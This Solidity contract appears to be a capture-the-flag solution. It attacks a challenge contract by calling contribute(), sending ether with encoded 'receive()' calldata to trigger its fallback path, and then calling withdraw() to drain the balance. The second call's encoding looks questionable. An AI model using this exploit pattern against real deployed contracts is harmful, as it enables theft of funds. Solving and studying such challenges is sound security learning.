// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract ChallengeX {
    address payable challengeInstance;
    constructor(address payable _challengeInstance) {
        challengeInstance = _challengeInstance;
    }
    function attack() public payable {
        bytes memory payload = abi.encodeWithSignature('contribute()');
        (bool success,) = address(challengeInstance).call{value: msg.value/2}(payload);
        require(success);
        bytes memory payload2 = abi.encodeWithSignature('receive()');
        (bool success2,) = address(challengeInstance).call{value: msg.value/2}(payload2);
        require(success2);
    }

    function withdrawFunds() public {
        bytes memory payload3 = abi.encodeWithSignature('withdraw()');
        (bool success3,) = address(challengeInstance).call(payload3);
        require(success3);
    }

    receive() external payable {
    }
}